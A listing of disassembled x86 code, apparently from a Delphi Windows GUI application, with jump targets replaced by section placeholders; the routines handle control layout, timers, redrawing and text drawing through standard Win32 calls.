xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_40291c
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_40291c
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_40291c
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_40291c
mov esi eax
jmp r-xdata
sub_42a074
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_42a125
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_429f48
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_41d91c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a12c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41d1f0
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_41d510
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41d8d4
sub_42a134
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_4514e0
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_440e2c
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_440b28
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_43b4f4
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42a1cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_42a134
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_42a2a8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_420188
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_4201a0
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_429f48
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_420188
push eax
mov eax [ ebx + 0x168 ]
call sub_4201a0
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_42a134
test al al
je r-xdata
sub_42a3d0
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_420188
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_420188
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_4201a0
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_4201a0
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_42a438
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419854
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42a4c0
call sub_41a9a0
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42a488
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42a534
mov eax [ esi + 0x34 ]
call sub_41aa54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42a4c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42a4fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a534
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42a5b3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a5ba
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
sub_42a60c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44273c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42f358
call sub_42f438
test al al
je r-xdata
add esp 0xfffffff0
call sub_403428
mov edx 0xb9
mov eax esi
call sub_439b08
mov edx 0x29
mov eax esi
call sub_439b2c
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42aa5c
mov edx 0x1
mov eax esi
call sub_42aa78
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_43a4ec
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_440dbc
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42a6d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d9b4
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42a740
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_440140
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_43e0c8
sub_42a780
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42a870
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43a34c
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_43f004
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a877
lea eax [ ebp - 0x14 ]
call sub_403e54
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_440b28
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_440b28
push eax
call InvalidateRect
sub_42a880
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42a8b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42aa1a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_429e04
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42a880
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_429e04
mov esi [ ebx + 0x208 ]
call sub_42f358
call sub_42f438
test al al
je r-xdata
push ebp
call sub_42a880
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_429e04
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d3f4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41d798
mov eax ebx
call sub_441c74
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_43c620
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x1c ]
call sub_404314
push eax
mov eax esi
call sub_41db3c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa21
lea eax [ ebp - 0x1c ]
call sub_403e54
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d510
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41da5c
mov edx r-xdata
mov eax esi
call sub_41d9b8
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42aacc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cb94
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42ab24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f7bc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42ac45
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43f7bc
call sub_40393c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_439b2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_439b08
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42ac60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_441670
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42ac8c
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_441c7c
pop esi
pop ebx
retn
sub_42accc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xae
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
lodsd [ esi ]
inc edx
add al bh
lodsd [ esi ]
inc edx
add [ edx + eax ] bl
add [ eax ] al
jl r-xdata
inc edx
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0xb4004030
scasb [ edi ]
sub_42ae30
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_433c0c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413c10
xor edx edx
mov eax edi
call sub_43a26c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43a4c0
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42b260
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42aeb4
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413eb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c978
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42aeec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42af51
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_433f0c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42af56
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45a284
call sub_40390c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42af7c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_43fb0c
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403300
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42afbc
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43f954
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403300
pop edx
pop esi
pop ebx
retn
sub_42afe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4327c8
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42b298
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_42b078
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42b30c
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403104
mov eax [ esi + 0x210 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_442798
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_42b0c8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41cc3c
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42b251
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_440b28
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43a26c
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_439d50
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_413d6c
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403300
test al al
je r-xdata
sub_42b260
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413dc8
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_439f58
mov eax ebx
mov si 0xffeb
call sub_403300
sub_42b298
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42b410
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42b30c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ae30
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413e54
call sub_403104
pop edi
pop esi
pop ebx
retn
sub_42b34c
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
